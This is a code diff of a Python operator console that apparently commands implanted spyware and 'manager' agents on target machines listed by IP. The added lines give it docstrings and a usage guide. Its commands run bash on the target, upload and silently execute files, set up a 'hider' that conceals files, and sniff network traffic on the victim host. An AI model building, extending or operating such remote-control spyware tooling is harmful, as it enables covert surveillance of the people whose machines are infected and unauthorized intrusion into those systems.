@@ -1,30 +1,18 @@
-"""
-from connection import Connection
-from listener import Listener
-from command import Command
-from responce import Responce
-from status import Status
-from icecream import ic
-"""
-
 from agent import Agent
 from operation import Operation
 from contParams import *
 from funCode import FunCode
+import tabulate
 
-
-# class Agent():
-#     def __init__(self, x):
-#         self.x = x
-
-#     def f(self, s):
-#         print(f'f {self.x}: {s}')
-
-# class Operation():
-#     def __init__(self, s):
-#         self.spyAgent = Agent(s)
-#         self.managerAgent = Agent(s)
-
+USAGE_EXAMPLE = """-------Try This-------
+$ ops
+$ select <ip>
+$ manager write_file <hiderPathHome> <pathTarget>
+$ setup <hiderPathTarget> <imagePath> <mountPath>
+$ uprun <spyPathHome> <spyPathTarget>
+$ setup <hiderPathTarget> <imagePath> <mountPath>
+$ sniff 30
+"""
 
 def LOG(s: str):
     print(f"LOG: {s}")
@@ -59,7 +47,6 @@ def parse_args(args: str):
                 quoted.append(arg)
         else:
             parsed.append(arg)
-    print(f"DB: {parsed=}")
     return parsed
 
 
@@ -87,11 +74,16 @@ def print_methods(obj):
     methods = [
         attr
         for attr in attributes
-        if callable(getattr(obj, attr)) and not attr.startswith("__")
+        if callable(getattr(obj, attr)) and not "__" in attr
     ]
     print("YAY: Available Methods: (q for exit)")
-    print(methods)
+    print(*methods, sep=' * ')
 
+def search_op(oper_dict: dict[str, Operation], name: str):
+    for ip, op in oper_dict.items():
+        if op.name == name:
+            return op
+    return None
 
 class UI:
     def __init__(self, operations: dict[str, Operation]) -> None:
@@ -103,54 +95,120 @@ class UI:
             return False
         return True
 
+    def usage(self):
+        """
+        USAGE: usage
+        Prints the usage example of the entire UI
+        """
+        print(USAGE_EXAMPLE)
+
     def select(self, name: str):
-        if name not in self.ctx.oper_dict.keys():
+        """
+        USAGE: select <name>
+        Set operation for future actions
+        """
+        op = search_op(self.ctx.oper_dict, name)
+        if not op:
             print("OOPSIE: Contraption not found")
-        self.ctx.selected_operation = self.ctx.oper_dict[name]
+        self.ctx.selected_operation = op
         LOG(f"Selected {name}")
 
     def spyware(self, method, *args):
+        """
+        USAGE: spyware <method> <arg1> ... <argn> 
+        Make spyware of selected operation perform action and print result
+        Returns: result of action
+        """
         if self.is_op_active():
-            return call_method(self.ctx.selected_operation.spyAgent, method, *args)
+            res = call_method(self.ctx.selected_operation.spyAgent, method, *args)
+            print(res)
+            return res
 
     def manager(self, method, *args):
+        """
+        USAGE: manager <method> <arg1> ... <argn> 
+        Make manager of selected operation perform action and print result
+        Returns: result of action
+        """
         if self.is_op_active():
-            return call_method(self.ctx.selected_operation.managerAgent, method, *args)
+            res = call_method(self.ctx.selected_operation.managerAgent, method, *args)
+            print(res)
+            return res
 
-    # list operations
     def ops(self):
-        print("YAY: Available operations:")
-        for op_name in self.ctx.oper_dict.keys():
-            if self.ctx.selected_operation == self.ctx.oper_dict[op_name]:
-                print("-> ", end="")
-            else:
-                print("   ", end="")
-            print(f"{op_name}")
+        """
+        USAGE: ops
+        Print list of active operations.
+        """
+        weird_dict = [{'IP': ip, 'Name': op.name, 'Selected': op == self.ctx.selected_operation} for ip, op in self.ctx.oper_dict.items()]
+        print(tabulate.tabulate(weird_dict, headers="keys", tablefmt="simple"))
+
 
     def rename(self, old_name, new_name):
-        if old_name not in self.ctx.oper_dict.keys():
+        """
+        USAGE: rename <old_name> <new_name>
+        """
+        op = search_op(self.ctx.oper_dict, old_name)
+        if not op:
             print("OOPSIE: Operation not found")
             return
-        if new_name in self.ctx.oper_dict.keys():
+        
+        if not search_op(self.ctx.oper_dict, new_name) == None:
             print("OOPSIE: new name exists")
             return
-        self.ctx.oper_dict[new_name] = self.ctx.oper_dict.pop(old_name)
+        
+        op.name = new_name
 
-    # list agent operations
-    def agentops(self):
+    def agenthelp(self):
+        """
+        USAGE: agenthelp
+        Print list of actions performable on agents
+        """
         print_methods(Agent(0))
 
-    def help(self):
-        print_methods(self)
+    def help(self, method=''):
+        """
+        USAGE: help <method>
+        USAGE: help
+
+        Print help information. 
+        - if received method prints doc of method
+        - if not prints list of methods
+
+        Args:
+            method - name of method of UI
+        """
+        if not method:
+            print_methods(self)
+            print('* For arguments with spaces wrap them in "')
+        else:
+            try:
+                print(getattr(self, method).__doc__)
+            except Exception as e:
+                print(e)
 
     def bash(self, cmd: str):
+        """
+        USAGE: bash <cmd>
+        Executes bash command on manager
+        Prints result.
+
+        Args:
+            cmd - bash command to execute
+                  if more than 1 word wrap in '
+        Returns:
+            Result (stdout) of command
+        """
         if not self.is_op_active():
             return
         res = self.manager("run_bash", cmd)
-        print(f"DB: {res=}")
         return res[1]
 
     def opstat(self):
+        """
+        USAGE: opstat
+        Shows the statuses of the components of the selected operation
+        """
         if not self.is_op_active():
             return
         if self.ctx.selected_operation.managerAgent:
@@ -163,9 +221,17 @@ class UI:
             print(f"YAY: NetDriver: {self.ctx.selected_operation.netDriver}")
 
     def findNet(self):
+        """
+        USAGE: findNet
+        Finds a network driver in the target machine
+        Saves result in the operation class
+
+        Returns:
+            whether or not a net was found
+        """
         nets = self.bash("ls /sys/class/net").split("\n")
         for net in nets:
-            if net != "lo":
+            if net and net != "lo":
                 self.ctx.selected_operation.netDriver = net
                 LOG(f"Set {net=}")
                 return True
@@ -173,6 +239,17 @@ class UI:
         return False
 
     def sniff(self, time):
+        """
+        USAGE: sniff <time>
+        Performs sniffing on spyware
+        Tries to find a net if it was not set.
+        
+        @pre:
+        hider was setup in spyware
+        
+        Args:
+            time - how many seconds to sniff
+        """
         time = int(time)
         if not self.is_op_active():
             return
@@ -190,21 +267,27 @@ class UI:
         self.ctx.cont_ident += 1
 
     def setup(self, targetPath, imagePath, mountPath):
+        """
+        USAGE: setup <targetPath> <imagePath> <mountPath>
+        Set hider path and other params in manager and spyware (if exists)
+        
+        Args:
+            targetPath - path of hider. needs to already be in machine
+            imagePath, mountPath - params for hiding
+        """
         if not self.is_op_active():
             return
-        try:
-            self.ctx.selected_operation.managerAgent.hider_setup(
-                targetPath, imagePath, mountPath
-            )
-            LOG(f"Setup Manager hider")
-            self.ctx.selected_operation.spyAgent.hider_setup(
-                targetPath, imagePath, mountPath
-            )
-            LOG(f"Setup Spyware hider")
-        except Exception as e:
-            print(
-                f"DB: {e=}"
-            )  # first trying to setup spyware hider will fail because no spyware
+        print(self.ctx.selected_operation.managerAgent.hider_setup(
+            targetPath, imagePath, mountPath
+        ))
+        LOG(f"Manager hider set")
+        spy = self.ctx.selected_operation.spyAgent
+        if not spy:
+            return
+        print(spy.hider_setup(
+            targetPath, imagePath, mountPath
+        ))
+        LOG(f"Spyware hider set")
 
     def check_ready(self):
         if not self.is_op_active():
@@ -214,25 +297,64 @@ class UI:
             return False
         return True
 
-    def uprun(self, homePath, targetPath):
+    def run(self, targetPath):
+        """
+        USAGE: run <targetPath>
+        Run a file in target machine
+        
+        Args:
+            targetPath - path of file. Needs to already be in target machine
+        Returns:
+            result of the startup
+        """
         if self.check_ready():
-            self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
+            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
+                FunCode.HIDDEN_RUN,
+                targetPath,
+            )
+            print(res)
+
+    def uprun(self, homePath, targetPath):
+        """
+        USAGE: uprun <homePath> <targetPath>
+        Upload and run a file in target machine
+        
+        Args:
+            homePath - path on home machine
+            targetPath - path to save on target. Overwriting if exists
+        Returns:
+            result of the startup
+        """
+        if self.check_ready():
+            res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                 FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
                 homePath,
                 targetPath,
             )
+            print(res)
 
     def upload(self, homePath, targetPath):
+        """
+        USAGE: upload <homePath> <targetPath>
+        Upload a file to target machine.
+        Does not run file
+        
+        Args:
+            homePath - path on home machine
+            targetPath - path to save on target. Overwriting if exists
+        Returns:
+            result of the upload
+        """
         if self.check_ready():
-            self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
+            print(self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                 FunCode.HIDDEN_UPLOAD,
                 homePath,
                 targetPath,
-            )
+            ))
 
     def list_ops_names(self):
-        for op_name in self.ctx.oper_dict.keys():
-            print(op_name)
+        for op in self.ctx.oper_dict.values():
+            print(op)
 
 
 if __name__ == "__main__":
